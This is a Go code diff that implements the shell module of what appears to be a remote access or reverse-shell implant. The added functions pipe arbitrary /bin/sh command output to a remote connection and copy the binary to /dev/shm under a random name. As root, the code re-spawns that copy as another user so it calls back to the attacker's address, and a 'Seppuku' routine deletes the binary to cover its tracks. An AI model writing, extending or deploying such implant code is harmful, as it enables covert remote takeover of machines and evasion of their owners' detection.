@@ -2,7 +2,15 @@ package shell
 
 import (
 	"net"
+	"log"
+	"os"
 	"os/exec"
+	"os/user"
+	"fmt"
+	"strings"
+	"errors"
+
+	"../utils"
 )
 
 /*
@@ -11,65 +19,119 @@ import (
 
 // Shell ...
 func Shell() *exec.Cmd {
-	panic("Not implemented")
+	cmd := exec.Command("/bin/bash", "-i")
+	return cmd
 }
 
 // Exec ...
-func Exec(command string, conn net.Conn) {
-	panic("Not implemented")
+func Exec(command string, c net.Conn) {
+	path := "/bin/sh"
+	cmd := exec.Command(path, "-c", command)
+	cmd.Stdout = c
+	cmd.Stderr = c
+	cmd.Run()
 }
 
 // RunAsPs ...
-func RunAs(user string, pass string, domain string, c net.Conn) {
-	panic("Not implemented")
+func RunAs(username string, pass string, domain string, c net.Conn) {
+	current, err := user.Current()
+	if (err != nil) {
+		c.Write([]byte("Error: " + err.Error() + "\n"))
+		return
+	}
+	uid := current.Uid
+	if (uid == "0") {
+		path := CopySelf()
+		err = os.Chmod(path, 0755)
+		if (err != nil) {
+			c.Write([]byte("Error: Couldn't chmod\n"))
+			return
+		}
+		ip, port := utils.SplitAddress(c.RemoteAddr().String())
+		args := fmt.Sprintf("%s %s %s", path, ip, port)
+		fmt.Println(args)
+		err = CreateProcessAsUser(username, path, args)
+		if (err != nil) {
+			c.Write([]byte("Error: " + err.Error() + "\n"))
+			return
+		}
+		fmt.Println("Closing...")
+		c.Close()
+		return
+	} else {
+		c.Write([]byte("Error: Not root\n"))
+		return
+	}
 }
 
 // RunAsPs ...
-func RunAsPS(user string, pass string, domain string, c net.Conn) {
-	panic("Not implemented")
+func RunAsPS(username string, pass string, domain string, c net.Conn) {
+	c.Write([]byte("Not implemented\n"))
 }
 
 // ExecSC ....
 func ExecSC(sc []byte) {
-	panic("Not implemented")
+	fmt.Println("Not implemented")
 }
 
 // ExecOut ...
 func ExecOut(command string) (string, error) {
-	panic("Not implemented")
-}
+	path := "/bin/sh"
+	cmd := exec.Command(path, "-c", command)
+	out, err := cmd.CombinedOutput()
+	return string(out), err}
 
 // ExecPSOut ...
 func ExecPSOut(command string) (string, error) {
-	panic("Not implemented")
+	fmt.Println("Not implemented")
+	return "", errors.New("Not implemented")
 }
 
 // ExecDebug ...
 func ExecDebug(cmd string) (string, error) {
-	panic("Not implemented")
+	out, err := ExecOut(cmd)
+	if err != nil {
+		log.Println(err)
+		return err.Error(), err
+	}
+	fmt.Printf("%s\n", strings.TrimLeft(strings.TrimRight(out, "\r\n"), "\r\n"))
+	return out, err
 }
 
 // ExecPSDebug ...
 func ExecPSDebug(cmd string) (string, error) {
-	panic("Not implemented")
+	fmt.Println("Not implemented")
+	return "", errors.New("Not implemented")
 }
 
 // Powershell ...
-func Powershell() *exec.Cmd {
-	panic("Not implemented")
+func Powershell() (*exec.Cmd, error) {
+	fmt.Println("Not implemented")
+	return nil, errors.New("Not implemented")
 }
 
 // CopySelf ...
 func CopySelf() string {
-	panic("Not implemented")
+	currentPath := os.Args[0]
+	// random name
+	name := utils.RandSeq(8)
+	path := fmt.Sprintf("/dev/shm/%s", name)
+	utils.CopyFile(currentPath, path)
+	return path
 }
 
 // ExecSilent ...
-func ExecSilent(cmd string, c net.Conn) {
-	panic("Not implemented")
+func ExecSilent(command string, c net.Conn) {
+	path := "/bin/sh"
+	cmd := exec.Command(path, "-c", command)
+	cmd.Stdout = c
+	cmd.Stderr = c
+	cmd.Run()
 }
 
 // Seppuku ...
 func Seppuku(c net.Conn) {
-	panic("Not implemented")
+	binPath := os.Args[0]
+	fmt.Println(binPath)
+	go Exec(fmt.Sprintf("sleep 5 && rm %s", binPath), c)
 }
